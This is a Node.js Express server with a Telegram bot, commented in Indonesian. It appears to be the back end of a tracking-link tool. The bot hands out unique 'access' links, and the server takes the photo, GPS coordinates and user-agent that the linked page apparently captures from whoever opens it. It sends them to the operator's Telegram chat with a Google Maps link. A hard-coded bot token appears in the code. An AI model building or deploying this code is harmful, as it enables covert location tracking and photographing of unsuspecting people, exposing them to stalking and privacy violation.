const express = require("express");
const { Telegraf } = require("telegraf");
const multer = require("multer");
const FormData = require("form-data");
const fetch = require("node-fetch");

const app = express();
const upload = multer();

// Bot Telegram
const BOT_TOKEN = "8179083757:AAHqeyoHWGI9cGHkgjSplUKXGGAn2D6goKQ"; // Ganti dengan token bot Anda
const bot = new Telegraf(BOT_TOKEN);

// Jalankan bot polling
bot.launch();

// Command /link untuk membuat tautan unik
bot.command("link", (ctx) => {
    const sessionId = Math.random().toString(36).substr(2, 9); // ID sesi unik
    const websiteLink = `https://akhirpetang.vercel.app/access?session=${sessionId}`; // URL website Anda
    ctx.reply(`Silakan klik link berikut untuk akses:\n${websiteLink}`);
});

// Endpoint untuk menerima data dari website
app.post("/send-data", upload.single("photo"), async (req, res) => {
    try {
        const { latitude, longitude } = req.body; // Lokasi
        const session = req.query.session; // ID sesi
        const userAgent = req.headers["user-agent"]; // User-Agent pengguna

        const chatId = "YOUR_CHAT_ID"; // Ganti dengan ID chat Anda
        const caption = `
📍 **Data Pengguna:**
- User-Agent: ${userAgent}
- Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
- Sesi: ${session}
        `;

        // Kirim foto ke bot Telegram
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", req.file.buffer, "photo.jpg");
        formData.append("caption", caption);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData,
        });

        res.status(200).send("Data berhasil dikirim ke bot!");
    } catch (error) {
        console.error("Error:", error);
        res.status(500).send("Terjadi kesalahan.");
    }
});

// Jalankan server di Vercel (Vercel menangani `port`)
app.all("*", (req, res) => {
    res.status(404).send("Endpoint tidak ditemukan.");
});

module.exports = app;
